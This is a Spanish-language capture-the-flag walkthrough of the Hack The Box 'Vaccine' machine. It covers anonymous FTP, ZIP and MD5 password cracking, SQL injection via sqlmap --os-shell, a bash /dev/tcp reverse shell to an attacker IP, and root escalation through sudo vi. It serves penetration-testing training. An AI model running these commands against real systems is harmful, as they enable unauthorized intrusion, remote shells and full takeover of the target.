# Manual Técnico: Hack The Box — Máquina Vaccine
### Explotación de FTP Anónimo, Cracking de ZIP, Inyección SQL y Escalada de Privilegios con vi

---

## Tabla de Contenidos

1. [Introducción y Contexto](#1-introducción-y-contexto)
2. [Reconocimiento y Enumeración](#2-reconocimiento-y-enumeración)
   - 2.1 [Escaneo de Puertos con Nmap](#21-escaneo-de-puertos-con-nmap)
3. [Acceso FTP Anónimo y Descarga de Archivos](#3-acceso-ftp-anónimo-y-descarga-de-archivos)
4. [Cracking del Archivo ZIP Protegido](#4-cracking-del-archivo-zip-protegido)
   - 4.1 [Concepto Teórico: Hash de Contraseña en Archivos ZIP](#41-concepto-teórico-hash-de-contraseña-en-archivos-zip)
   - 4.2 [Extracción del Hash con zip2john](#42-extracción-del-hash-con-zip2john)
   - 4.3 [Cracking del Hash con John the Ripper](#43-cracking-del-hash-con-john-the-ripper)
   - 4.4 [Visualización de Hashes ya Craqueados](#44-visualización-de-hashes-ya-craqueados)
5. [Análisis del Código Fuente PHP e Identificación de Credenciales](#5-análisis-del-código-fuente-php-e-identificación-de-credenciales)
   - 5.1 [Concepto Teórico: Hash MD5](#51-concepto-teórico-hash-md5)
   - 5.2 [Cracking del Hash MD5 con CrackStation](#52-cracking-del-hash-md5-con-crackstation)
6. [Acceso a la Aplicación Web](#6-acceso-a-la-aplicación-web)
7. [Identificación y Explotación de Inyección SQL](#7-identificación-y-explotación-de-inyección-sql)
   - 7.1 [Concepto Teórico: SQL Injection](#71-concepto-teórico-sql-injection)
   - 7.2 [Identificación Manual de la Vulnerabilidad](#72-identificación-manual-de-la-vulnerabilidad)
   - 7.3 [Uso de SQLMap con Cookie de Sesión](#73-uso-de-sqlmap-con-cookie-de-sesión)
   - 7.4 [Obtención de Shell con --os-shell](#74-obtención-de-shell-con---os-shell)
8. [Reverse Shell hacia la Máquina Atacante](#8-reverse-shell-hacia-la-máquina-atacante)
   - 8.1 [Concepto Teórico: Reverse Shell](#81-concepto-teórico-reverse-shell)
   - 8.2 [Herramienta: Penelope](#82-herramienta-penelope)
   - 8.3 [Ejecución de la Reverse Shell con Bash](#83-ejecución-de-la-reverse-shell-con-bash)
9. [Enumeración Post-Explotación y Obtención de Credenciales](#9-enumeración-post-explotación-y-obtención-de-credenciales)
10. [Escalada de Privilegios con vi y sudo](#10-escalada-de-privilegios-con-vi-y-sudo)
    - 10.1 [Concepto Teórico: Permisos sudo y GTFOBins](#101-concepto-teórico-permisos-sudo-y-gtfobins)
    - 10.2 [Identificación de Privilegios con sudo -l](#102-identificación-de-privilegios-con-sudo--l)
    - 10.3 [Explotación del Binario vi para Escalar a Root](#103-explotación-del-binario-vi-para-escalar-a-root)
11. [Captura de la Flag](#11-captura-de-la-flag)
12. [Resumen de Puntos Clave](#12-resumen-de-puntos-clave)
13. [Inventario Final de Herramientas](#13-inventario-final-de-herramientas)

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 1. Introducción y Contexto

La máquina **Vaccine** de Hack The Box es un entorno de práctica basado en **Linux** que requiere la explotación encadenada de múltiples vectores de ataque. La máquina forma parte del nivel introductorio (Tier 2) de Starting Point y está diseñada para familiarizar al estudiante con técnicas comunes en auditorías de aplicaciones web y sistemas Linux.

Las técnicas y vulnerabilidades explotadas en esta máquina son:

- **Acceso FTP anónimo:** permite descargar archivos sin necesidad de credenciales.
- **Cracking de archivos ZIP protegidos:** mediante extracción del hash y ataque por diccionario.
- **Análisis de código fuente PHP:** permite identificar credenciales almacenadas como hashes MD5.
- **SQL Injection:** vulnerabilidad en un parámetro de búsqueda que permite interactuar directamente con la base de datos del servidor.
- **Reverse Shell a través de SQLMap:** explotación de la inyección SQL para obtener una terminal interactiva en la máquina víctima.
- **Escalada de privilegios mediante misconfiguration de sudo:** abuso del editor de texto `vi` con permisos de root.

El flujo de ataque sigue la metodología estándar de pruebas de penetración: reconocimiento → enumeración → identificación de vulnerabilidades → explotación → escalada de privilegios → captura de la flag.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 2. Reconocimiento y Enumeración

### 2.1 Escaneo de Puertos con Nmap

Se realiza un escaneo de los puertos principales con detección de versiones y ejecución de scripts básicos de Nmap.

```bash
nmap -sV -sC <IP_OBJETIVO> -oN vaccine_scan
```

**Descripción de los parámetros:**

| Flag | Descripción |
|------|-------------|
| `-sV` | Detecta versiones de los servicios en ejecución. |
| `-sC` | Ejecuta los scripts NSE (Nmap Scripting Engine) por defecto. |
| `<IP_OBJETIVO>` | Dirección IP del sistema objetivo. |
| `-oN vaccine_scan` | Guarda la salida en formato normal en el archivo `vaccine_scan`. |

**Puertos relevantes identificados:**

| Puerto | Servicio | Descripción |
|--------|----------|-------------|
| 21 | FTP | Servidor FTP con acceso anónimo habilitado. |
| 22 | SSH | Servicio SSH. Permite acceso remoto con credenciales válidas. |
| 80 | HTTP | Servidor web con una aplicación PHP. |

> **Nota:** El flag `-oN` guarda la salida del escaneo en un archivo de texto. Su uso es una buena práctica en toda auditoría, ya que permite consultar los resultados sin repetir el escaneo. Aunque el flag `--min-rate` puede acelerar el proceso en entornos controlados, no se recomienda en auditorías de entornos reales, ya que puede generar tráfico excesivo y ser detectado.

**Resumen de puntos clave — Sección 2:**
- El puerto 21 con FTP anónimo es un vector de entrada habitual en máquinas de nivel introductorio.
- El puerto 22 (SSH) puede ser utilizado más adelante si se obtienen credenciales válidas.
- El flag `-oN` debe utilizarse sistemáticamente para registrar los resultados del escaneo.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 3. Acceso FTP Anónimo y Descarga de Archivos

El servicio FTP de la máquina permite el acceso sin contraseña mediante el usuario `anonymous`. Esta configuración, habitual en servidores FTP mal configurados, permite descargar archivos expuestos en el servidor.

```bash
ftp <IP_OBJETIVO>
```

Al solicitarse el nombre de usuario, se introduce `anonymous` (o `-a`). No se requiere contraseña. Una vez dentro, se descarga el archivo disponible:

```bash
get backup.zip
bye
```

**Descripción de los comandos FTP:**

| Comando | Descripción |
|---------|-------------|
| `ftp <IP>` | Inicia una conexión FTP con la IP especificada. |
| `anonymous` | Usuario estándar para acceso FTP sin autenticación. |
| `get backup.zip` | Descarga el archivo `backup.zip` al directorio local. |
| `bye` | Cierra la sesión FTP. |

> **Nota:** El acceso FTP anónimo permite listar y descargar archivos públicamente expuestos. En auditorías reales, este hallazgo debe documentarse como una misconfiguration crítica.

**Resumen de puntos clave — Sección 3:**
- El usuario `anonymous` es el estándar para acceso FTP sin credenciales; debe comprobarse en todo servicio FTP detectado.
- Los archivos descargados desde FTP pueden contener información sensible como copias de seguridad de código fuente o configuraciones.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 4. Cracking del Archivo ZIP Protegido

### 4.1 Concepto Teórico: Hash de Contraseña en Archivos ZIP

Los archivos ZIP pueden estar protegidos por contraseña. Internamente, la contraseña no se almacena en texto claro, sino como un hash derivado de ella. La herramienta `zip2john` permite extraer ese hash en un formato compatible con **John the Ripper**, un cracker de contraseñas por fuerza bruta.

El proceso consta de dos pasos:
1. Extraer el hash del ZIP con `zip2john`.
2. Craquear el hash con `john` y un diccionario de contraseñas.

---

### 4.2 Extracción del Hash con zip2john

```bash
zip2john backup.zip > hash.txt
```

**Descripción de los parámetros:**

| Elemento | Descripción |
|----------|-------------|
| `zip2john` | Herramienta que extrae el hash de contraseña de un archivo ZIP protegido. |
| `backup.zip` | Archivo ZIP del que se desea extraer el hash. |
| `> hash.txt` | Redirige la salida estándar al archivo `hash.txt`. |

El archivo `hash.txt` resultante contendrá el hash de la contraseña en formato compatible con John the Ripper. Dicho hash hace referencia a cada uno de los archivos contenidos dentro del ZIP.

---

### 4.3 Cracking del Hash con John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Descripción de los parámetros:**

| Flag | Descripción |
|------|-------------|
| `john` | Herramienta de cracking de contraseñas John the Ripper. |
| `--wordlist=` | Especifica el diccionario de contraseñas a utilizar en el ataque. |
| `/usr/share/wordlists/rockyou.txt` | Ruta al diccionario `rockyou.txt`, el más utilizado en auditorías estándar. |
| `hash.txt` | Archivo que contiene el hash a craquear, generado por `zip2john`. |

> **Nota:** `zip2john` genera hashes en un formato específico para John the Ripper. Este formato no es directamente compatible con Hashcat, por lo que en este caso se utiliza John en lugar de Hashcat.

**Salida esperada cuando el cracking es exitoso:**
```
741852963    (backup.zip)
```

La contraseña del archivo ZIP es: **`741852963`**

Una vez obtenida la contraseña, se extrae el contenido del ZIP:

```bash
unzip backup.zip
```

Se introduce la contraseña cuando se solicita. Los archivos extraídos son `index.php` y `style.css`.

---

### 4.4 Visualización de Hashes ya Craqueados

John the Ripper almacena los hashes que ya ha craqueado en sesiones anteriores. Para consultar resultados sin repetir el proceso de cracking:

```bash
john --show hash.txt
```

**Descripción del parámetro:**

| Flag | Descripción |
|------|-------------|
| `--show` | Muestra los hashes que John ya ha craqueado en sesiones anteriores para el archivo especificado. |

**Resumen de puntos clave — Sección 4:**
- `zip2john` convierte la contraseña de un ZIP en un hash compatible con John the Ripper.
- John the Ripper es la herramienta adecuada para craquear hashes generados por `zip2john`; no se utiliza Hashcat en este caso porque el formato de hash no es compatible.
- El flag `--show` permite recuperar contraseñas ya craqueadas sin repetir el proceso.
- `rockyou.txt` debe estar descomprimido antes de su uso: `sudo gzip -d /usr/share/wordlists/rockyou.txt.gz`.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 5. Análisis del Código Fuente PHP e Identificación de Credenciales

Tras extraer el contenido del ZIP, se analiza el archivo `index.php` para identificar la lógica de autenticación de la aplicación web.

```bash
cat index.php
```

En el encabezado del archivo se encuentra el siguiente fragmento de código PHP:

```php
if ($_POST['username'] == 'admin' && md5($_POST['password']) == '2cb42f8734ea607eefed3b70af13bde3') {
    // login correcto
}
```

**Análisis del código:**

| Elemento | Descripción |
|----------|-------------|
| `$_POST['username']` | Recibe el nombre de usuario enviado por el formulario de login. |
| `$_POST['password']` | Recibe la contraseña enviada por el formulario de login. |
| `md5(...)` | Función de PHP que genera el hash MD5 de la contraseña introducida. |
| `'2cb42f8734ea607eefed3b70af13bde3'` | Hash MD5 correspondiente a la contraseña del usuario `admin`. |

Este código comprueba que el usuario sea `admin` y que el MD5 de la contraseña coincida con el hash almacenado. Si ambas condiciones se cumplen, el login es correcto.

### 5.1 Concepto Teórico: Hash MD5

**MD5 (Message Digest Algorithm 5)** es una función de hash criptográfico que genera una cadena hexadecimal de 32 caracteres a partir de cualquier entrada. Aunque fue ampliamente utilizado para almacenar contraseñas, actualmente se considera **inseguro** debido a su vulnerabilidad a ataques de fuerza bruta y colisiones.

Una contraseña hasheada en MD5 puede recuperarse en texto claro si dicho hash está indexado en bases de datos de hashes conocidos, o mediante un ataque por diccionario.

---

### 5.2 Cracking del Hash MD5 con CrackStation

**CrackStation** es una herramienta web que permite craquear hashes de forma automatizada consultando una base de datos interna de más de 1.500 millones de contraseñas previamente hasheadas.

**URL:** `https://crackstation.net`

**Procedimiento:**
1. Acceder a `https://crackstation.net`.
2. Introducir el hash MD5: `2cb42f8734ea607eefed3b70af13bde3`.
3. Completar el CAPTCHA y hacer clic en **Crack Hashes**.

**Resultado:**

| Hash | Tipo | Contraseña en texto claro |
|------|------|---------------------------|
| `2cb42f8734ea607eefed3b70af13bde3` | MD5 | `qwerty789` |

> **Nota:** CrackStation no garantiza el cracking de todos los hashes. Si la contraseña es suficientemente robusta o no está en su base de datos, el hash no se romperá. En ese caso, es necesario recurrir a Hashcat o John the Ripper con un diccionario externo.

**Resumen de puntos clave — Sección 5:**
- Analizar el código fuente de archivos PHP es una técnica fundamental de enumeración post-explotación.
- MD5 es un algoritmo de hash débil; las contraseñas hasheadas con MD5 son susceptibles de recuperación mediante herramientas en línea o ataques por diccionario.
- CrackStation es una herramienta web de referencia para craquear hashes comunes sin necesidad de ejecutar comandos localmente.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 6. Acceso a la Aplicación Web

Con las credenciales obtenidas del análisis del código fuente, se accede al panel de administración de la aplicación web.

**Credenciales:**
- **Usuario:** `admin`
- **Contraseña:** `qwerty789`

Se navega a `http://<IP_OBJETIVO>` e introducen las credenciales en el formulario de login. Tras autenticarse correctamente, se accede a una aplicación web que presenta un catálogo de vehículos con funcionalidad de búsqueda.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 7. Identificación y Explotación de Inyección SQL

### 7.1 Concepto Teórico: SQL Injection

**SQL Injection (SQLi)** es una vulnerabilidad que se produce cuando una aplicación web incorpora datos proporcionados por el usuario directamente en una consulta SQL sin la debida sanitización. Un atacante puede manipular la consulta original para extraer información de la base de datos, modificar datos o, en condiciones favorables, ejecutar comandos en el sistema operativo del servidor.

---

### 7.2 Identificación Manual de la Vulnerabilidad

La aplicación web dispone de un campo de búsqueda cuya URL adopta la siguiente estructura al realizar una consulta:

```
http://<IP_OBJETIVO>/dashboard.php?search=test
```

Para verificar si el parámetro `search` es vulnerable a SQL Injection, se introduce una comilla simple en el campo de búsqueda:

```
'
```

Si la aplicación devuelve un mensaje de error similar al siguiente, la vulnerabilidad queda confirmada:

```
ERROR: unterminated quoted string at or near "'" LINE 1: select * from cars where name ilike '%'%'
```

**Análisis:** La comilla simple rompe la sintaxis de la consulta SQL interna, haciendo que el servidor devuelva un error de base de datos en lugar de un resultado normal. Esto indica que la entrada del usuario se está incorporando directamente en la consulta SQL sin sanitización.

---

### 7.3 Uso de SQLMap con Cookie de Sesión

**SQLMap** es una herramienta de código abierto que automatiza la detección y explotación de vulnerabilidades de inyección SQL en aplicaciones web.

Dado que el parámetro vulnerable se encuentra detrás de un panel de login, es necesario proporcionar a SQLMap la cookie de sesión del usuario autenticado para que pueda acceder a dicho parámetro.

**Obtención de la cookie de sesión:**
1. Iniciar sesión en la aplicación web con las credenciales de `admin`.
2. Abrir las herramientas de desarrollo del navegador (F12).
3. Navegar a la pestaña **Application** → **Cookies**.
4. Copiar el valor de la cookie `PHPSESSID`.

**Ejecución de SQLMap:**

```bash
sqlmap -u 'http://<IP_OBJETIVO>/dashboard.php?search=*' --cookie="PHPSESSID=<VALOR_COOKIE>" --batch --os-shell
```

**Descripción de los parámetros:**

| Flag | Descripción |
|------|-------------|
| `-u` | Especifica la URL objetivo. Debe ir entre comillas simples. |
| `'...?search=*'` | El asterisco indica a SQLMap el parámetro exacto en el que debe probar las inyecciones. Si hay un solo parámetro, no es estrictamente necesario, pero es una buena práctica cuando hay múltiples parámetros en la URL. |
| `--cookie=` | Proporciona la cookie de sesión para que SQLMap pueda acceder a las partes de la aplicación protegidas por login. |
| `PHPSESSID=<VALOR>` | Cookie de sesión PHP que identifica al usuario autenticado. |
| `--batch` | Responde automáticamente a todas las preguntas interactivas de SQLMap con el valor por defecto, evitando interrupciones durante la ejecución. |
| `--os-shell` | En lugar de extraer la información de la base de datos, intenta abrir una pseudoterminal interactiva en el servidor víctima si la inyección lo permite. |

> **Nota importante:** Si SQLMap se lanza sin la cookie de sesión, no será capaz de acceder al parámetro `search` porque se encontrará con el formulario de login antes de llegar a la funcionalidad vulnerable. La cookie actúa como credencial que permite a SQLMap saltarse el panel de autenticación.

> **Sobre el asterisco en la URL:** Cuando la URL contiene un único parámetro, SQLMap lo detecta automáticamente. El uso del asterisco es especialmente útil cuando hay múltiples parámetros y se desea restringir la prueba a uno concreto, indicando a SQLMap: "prueba las inyecciones solo en el parámetro marcado con el asterisco".

---

### 7.4 Obtención de Shell con --os-shell

Si SQLMap identifica una inyección SQL explotable, el parámetro `--os-shell` abre una pseudoterminal interactiva que permite ejecutar comandos en el servidor víctima:

```
os-shell> whoami
```

Esta pseudoterminal no es totalmente interactiva (no soporta todos los comandos ni la navegación de directorios con `cd`). Para obtener una terminal completamente funcional, es necesario lanzar una reverse shell desde ella.

**Resumen de puntos clave — Sección 7:**
- Una comilla simple (`'`) en un campo de búsqueda es el método más rápido para identificar manualmente una posible inyección SQL.
- SQLMap requiere la cookie de sesión cuando el parámetro vulnerable está detrás de un panel de login.
- El flag `--batch` evita interrupciones durante la ejecución automatizada de SQLMap.
- El asterisco en la URL indica a SQLMap en qué parámetro concreto probar las inyecciones cuando hay varios disponibles.
- El flag `--os-shell` abre una pseudoterminal en la máquina víctima; sin embargo, para una sesión completamente interactiva es necesario lanzar una reverse shell.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 8. Reverse Shell hacia la Máquina Atacante

### 8.1 Concepto Teórico: Reverse Shell

Una **reverse shell** (o shell inversa) es una técnica por la cual la máquina víctima establece una conexión de salida hacia la máquina atacante, que se encuentra en escucha en un puerto determinado. El resultado es una sesión de terminal en la máquina víctima, controlada desde la máquina atacante.

Esta técnica es preferida a la **bind shell** en entornos reales porque evita las restricciones habituales de los firewalls, que suelen bloquear conexiones entrantes pero permiten conexiones de salida.

Para generar el comando correcto de reverse shell en función del sistema operativo y el lenguaje disponible, se recomienda consultar el recurso: `https://www.revshells.com`

---

### 8.2 Herramienta: Penelope

**Penelope** es una herramienta alternativa a Netcat para recibir reverse shells. A diferencia de Netcat, Penelope sanitiza automáticamente la terminal recibida, mejorando la interactividad y reduciendo errores comunes (autocompletado con TAB, historial de comandos, etc.).

**Instalación:**

```bash
pip install penelope --break-system-packages
```

**Uso básico:**

```bash
penelope <PUERTO>
```

**Descripción de los parámetros:**

| Elemento | Descripción |
|----------|-------------|
| `penelope` | Herramienta de escucha para recibir reverse shells con terminal mejorada. |
| `<PUERTO>` | Puerto en el que Penelope esperará la conexión entrante de la víctima. |

> **Alternativa con Netcat:** Si se utiliza Netcat en lugar de Penelope, puede ser necesario ejecutar los siguientes comandos tras establecer la sesión para mejorar la interactividad de la terminal:
> ```bash
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> export TERM=xterm
> ```

---

### 8.3 Ejecución de la Reverse Shell con Bash

Dado que el servidor víctima es una máquina Linux, se utiliza Bash para lanzar la reverse shell, ya que Bash está disponible en cualquier distribución Linux, independientemente de las herramientas adicionales instaladas.

**Paso 1 — Poner la máquina atacante en escucha:**

```bash
penelope 1337
```

**Paso 2 — Lanzar la reverse shell desde el os-shell de SQLMap:**

```bash
bash -c "bash -i >& /dev/tcp/<IP_ATACANTE>/1337 0>&1"
```

**Descripción del comando:**

| Elemento | Descripción |
|----------|-------------|
| `bash -c` | Indica a Bash que ejecute la cadena especificada como un comando. |
| `bash -i` | Abre una instancia interactiva de Bash. |
| `>&` | Redirige tanto la salida estándar como la salida de error al destino especificado. |
| `/dev/tcp/<IP>/<PUERTO>` | Pseudo-dispositivo de Linux que abre una conexión TCP hacia la IP y puerto indicados. |
| `0>&1` | Redirige la entrada estándar (stdin) al mismo destino que la salida, cerrando el circuito de comunicación. |

Cuando este comando se ejecuta en el servidor víctima, se establece una conexión TCP hacia la máquina atacante. Penelope recibe la conexión y presenta una terminal completamente interactiva del servidor víctima.

> **Por qué Bash y no Python u otros lenguajes:** En un servidor Linux desconocido no es posible garantizar que Python, Perl o Ruby estén instalados. Sin embargo, Bash forma parte del sistema base de prácticamente cualquier distribución Linux. Por esta razón, ante la incertidumbre sobre las herramientas disponibles en la víctima, se utiliza la reverse shell de Bash como opción más segura.

**Resumen de puntos clave — Sección 8:**
- Una reverse shell permite obtener una terminal interactiva en la máquina víctima eludiendo restricciones de firewall.
- Bash es la opción más confiable para reverse shells en sistemas Linux al estar disponible de forma universal.
- Penelope es una alternativa mejorada a Netcat que proporciona terminales más estables e interactivas.
- La web `https://www.revshells.com` es una referencia útil para generar comandos de reverse shell según el entorno.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 9. Enumeración Post-Explotación y Obtención de Credenciales

Una vez establecida la sesión en la máquina víctima como el usuario `postgres`, es necesario enumerar el sistema para obtener información adicional que permita escalar privilegios.

El usuario `postgres` ejecuta la aplicación web, por lo que los archivos de configuración de dicha aplicación pueden contener credenciales en texto claro.

```bash
cat /var/www/html/dashboard.php
```

En el archivo `dashboard.php` se localiza el fragmento de código que establece la conexión con la base de datos:

```php
$conn = pg_connect("host=localhost dbname=carsdb user=postgres password=P@s5w0rd!");
```

**Credenciales identificadas:**

| Parámetro | Valor |
|-----------|-------|
| Usuario | `postgres` |
| Contraseña | `P@s5w0rd!` |

> **Metodología:** Cuando se obtiene acceso a un servidor sin conocer la contraseña del usuario de la sesión, el primer enfoque debe ser revisar los archivos de configuración de las aplicaciones web activas. Estos archivos suelen contener cadenas de conexión a bases de datos con credenciales en texto claro.

Con la contraseña del usuario `postgres` ya disponible, se puede establecer una sesión SSH más estable:

```bash
ssh postgres@<IP_OBJETIVO>
```

**Resumen de puntos clave — Sección 9:**
- Los archivos de configuración de aplicaciones web son una fuente frecuente de credenciales en texto claro.
- Revisar los archivos PHP o de configuración del servidor web es uno de los primeros pasos de enumeración post-explotación.
- Una sesión SSH es más estable que una reverse shell y debe preferirse cuando se dispone de credenciales válidas.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 10. Escalada de Privilegios con vi y sudo

### 10.1 Concepto Teórico: Permisos sudo y GTFOBins

**sudo** es un mecanismo de Linux que permite a usuarios no privilegiados ejecutar comandos concretos con privilegios de otro usuario (habitualmente root), sin necesidad de conocer la contraseña de root.

La configuración de `sudo` puede ser demasiado permisiva, permitiendo a un usuario ejecutar como root utilidades que ofrecen capacidades de ejecución de comandos (editores de texto, intérpretes, utilidades del sistema). Este tipo de misconfiguration permite escalar privilegios.

**GTFOBins** (`https://gtfobins.github.io`) es una referencia esencial en auditorías de sistemas Linux. Cataloga todos los binarios del sistema que, cuando se pueden ejecutar con privilegios elevados, permiten la escalada de privilegios, la lectura de archivos o el establecimiento de shells. Para cada binario, GTFOBins proporciona directamente la cadena de comandos a ejecutar.

---

### 10.2 Identificación de Privilegios con sudo -l

El comando `sudo -l` permite al usuario actual consultar qué comandos puede ejecutar con privilegios de root según la política de `sudo` configurada en el sistema.

```bash
sudo -l
```

Se solicitará la contraseña del usuario `postgres`. Se introduce `P@s5w0rd!`.

**Salida esperada:**

```
User postgres may run the following commands on this host:
    (root) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

**Análisis:** El usuario `postgres` tiene permiso para ejecutar el editor de texto `vi` como root, pero únicamente para abrir el archivo de configuración `/etc/postgresql/11/main/pg_hba.conf`. Aunque la restricción parece limitar el uso, el comportamiento de `vi` permite ejecutar comandos del sistema operativo desde su interior, lo que posibilita la escalada de privilegios.

> **Nota sobre la interactividad de la terminal:** Si el comando `sudo -l` falla al intentar pegar la contraseña, la terminal puede necesitar ser estabilizada previamente con:
> ```bash
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> export TERM=xterm
> ```
> Alternativamente, se puede establecer una sesión SSH directa con las credenciales de `postgres`, que proporciona una terminal totalmente interactiva sin este problema.

---

### 10.3 Explotación del Binario vi para Escalar a Root

**vi** es un editor de texto de terminal que dispone de un modo de ejecución de comandos, accesible a través de su interfaz. Cuando `vi` se ejecuta con privilegios de root (mediante `sudo`), cualquier comando lanzado desde su interior también se ejecutará como root.

**Paso 1 — Abrir el archivo de configuración con vi como root:**

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

**Descripción del comando:**

| Elemento | Descripción |
|----------|-------------|
| `sudo` | Ejecuta el comando siguiente con privilegios de root. |
| `/bin/vi` | Ruta absoluta al editor de texto `vi`. |
| `/etc/postgresql/.../pg_hba.conf` | Archivo de configuración de PostgreSQL especificado en la política de sudo. |

**Paso 2 — Acceder al modo de comandos de vi:**

Una vez abierto el archivo en `vi`, se pulsa la tecla `Escape` para asegurarse de estar en modo normal. A continuación, se escribe el siguiente comando en la barra de comandos de `vi` (los caracteres aparecerán en la parte inferior de la pantalla):

```
:!/bin/bash
```

**Descripción:**

| Elemento | Descripción |
|----------|-------------|
| `Escape` | Asegura que `vi` está en modo normal antes de introducir comandos. |
| `:` | Activa el modo de línea de comandos de `vi`. Todo lo que se escriba aparece en la parte inferior de la pantalla. |
| `!` | Prefijo que indica a `vi` que ejecute el comando siguiente en el shell del sistema. |
| `/bin/bash` | Abre una instancia de Bash directamente desde `vi`. |

**Paso 3 — Presionar Enter.**

Al ejecutar `:!/bin/bash`, `vi` lanza una instancia de `/bin/bash` con los mismos privilegios con los que `vi` fue abierto, es decir, como **root**. El resultado es una terminal root completamente interactiva.

**Verificación:**

```bash
whoami
# Salida: root
```

> **Sobre GTFOBins:** Esta técnica está documentada en GTFOBins bajo la entrada `vi`. GTFOBins proporciona la cadena exacta a ejecutar para cada binario con privilegios, incluyendo variaciones según el contexto (sudo, SUID, etc.). Se recomienda consultar esta referencia siempre que se identifique un binario ejecutable con privilegios elevados en el resultado de `sudo -l`.

**Resumen de puntos clave — Sección 10:**
- `sudo -l` es el primer comando a ejecutar tras obtener acceso a una máquina Linux para identificar posibles vías de escalada de privilegios.
- Los editores de texto como `vi` o `nano` que pueden ejecutarse como sudo son vectores habituales de escalada de privilegios, ya que permiten lanzar comandos del sistema desde su interior.
- GTFOBins es la referencia fundamental para identificar cómo abusar de binarios con privilegios elevados.
- La secuencia en `vi` es: `Escape` → `:!/bin/bash` → `Enter`.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 11. Captura de la Flag

Una vez obtenida la sesión como root, se localiza y lee la flag del sistema:

```bash
find / -name "root.txt" 2>/dev/null
cat /root/root.txt
```

La flag del usuario no privilegiado puede localizarse en el directorio home correspondiente:

```bash
cat /home/<usuario>/user.txt
```

**Descripción de los comandos:**

| Comando | Descripción |
|---------|-------------|
| `find / -name "root.txt"` | Busca recursivamente desde la raíz el archivo `root.txt`. |
| `2>/dev/null` | Suprime los mensajes de error (p. ej., permisos denegados) para limpiar la salida. |
| `cat /root/root.txt` | Muestra el contenido de la flag de root. |

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 12. Resumen de Puntos Clave

**Reconocimiento:**
- Nmap con `-sV -sC` proporciona información detallada de servicios y versiones; el flag `-oN` guarda la salida para referencia posterior.
- El puerto 21 con FTP anónimo es un vector de entrada inmediato que debe comprobarse en toda auditoría.

**Cracking de Contraseñas:**
- `zip2john` extrae el hash de contraseña de archivos ZIP protegidos en formato compatible con John the Ripper.
- El flag `--show` de John the Ripper permite consultar contraseñas ya craqueadas sin repetir el proceso.
- MD5 es un algoritmo débil; sus hashes pueden resolverse con herramientas en línea como CrackStation.

**Análisis de Código Fuente:**
- Revisar archivos PHP extraídos o accesibles puede revelar credenciales, lógica de autenticación y estructuras de bases de datos.
- Las credenciales de conexión a bases de datos suelen estar en texto claro en archivos de configuración de la aplicación web.

**SQL Injection y SQLMap:**
- Una comilla simple en un campo de entrada es el método más rápido para identificar manualmente una posible inyección SQL.
- SQLMap requiere la cookie de sesión cuando el parámetro vulnerable está protegido por login.
- El flag `--batch` automatiza las respuestas interactivas de SQLMap.
- El asterisco en la URL indica a SQLMap en qué parámetro concreto probar; útil cuando hay múltiples parámetros.
- El flag `--os-shell` abre una pseudoterminal en el servidor; para una sesión completamente interactiva es necesario lanzar una reverse shell.

**Reverse Shell:**
- Bash es la opción más segura para reverse shells en Linux, al estar disponible de forma universal.
- Penelope es una alternativa mejorada a Netcat que estabiliza automáticamente la terminal recibida.
- `https://www.revshells.com` es una referencia útil para generar comandos de reverse shell.

**Escalada de Privilegios:**
- `sudo -l` es el primer comando a ejecutar en post-explotación para identificar privilegios mal configurados.
- Editores de texto como `vi` ejecutables con sudo permiten escalar a root mediante la ejecución de comandos desde su interfaz (`:!/bin/bash`).
- GTFOBins (`https://gtfobins.github.io`) es la referencia definitiva para explotar binarios con privilegios elevados.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 13. Inventario Final de Herramientas

| Herramienta / Plataforma | Tipo | Descripción | Instalación / Disponibilidad |
|--------------------------|------|-------------|------------------------------|
| **Nmap** | Escáner de red | Enumeración de puertos, servicios y versiones. Incluye scripts NSE. | Preinstalado en Kali Linux |
| **FTP (cliente)** | Protocolo de transferencia | Cliente para acceder a servicios FTP. Permite listar y descargar archivos. | Preinstalado en Kali Linux |
| **zip2john** | Extracción de hash | Extrae el hash de contraseña de archivos ZIP para su posterior cracking con John. | Preinstalado en Kali Linux (paquete `john`) |
| **John the Ripper** | Cracking de contraseñas | Herramienta de recuperación de contraseñas por fuerza bruta y diccionario. | Preinstalado en Kali Linux |
| **rockyou.txt** | Diccionario | Diccionario estándar de ~14 millones de contraseñas comunes. | `/usr/share/wordlists/rockyou.txt.gz` en Kali Linux |
| **CrackStation** | Servicio web de cracking | Plataforma web para craquear hashes MD5, SHA1 y otros mediante bases de datos precalculadas. | `https://crackstation.net` |
| **Wappalyzer** | Extensión de fingerprinting | Identifica tecnologías web (lenguajes, frameworks, CMS) desde el navegador. | Extensión para Firefox / Chrome |
| **SQLMap** | Explotación de SQLi | Herramienta automatizada para detección y explotación de inyecciones SQL. | Preinstalado en Kali Linux |
| **Penelope** | Escucha de reverse shells | Alternativa mejorada a Netcat para recibir reverse shells con terminal estabilizada. | `pip install penelope --break-system-packages` |
| **Netcat (nc)** | Utilidad de red | Herramienta clásica para establecer conexiones TCP/UDP, usada en escucha de reverse shells. | Preinstalado en Kali Linux |
| **Bash** | Shell / Lenguaje | Shell de Linux utilizado para ejecutar comandos y lanzar reverse shells. | Nativo en cualquier sistema Linux |
| **vi** | Editor de texto | Editor de texto en terminal con capacidad de ejecución de comandos del sistema. Explotado para escalada de privilegios cuando se ejecuta con sudo. | Nativo en la mayoría de sistemas Linux |
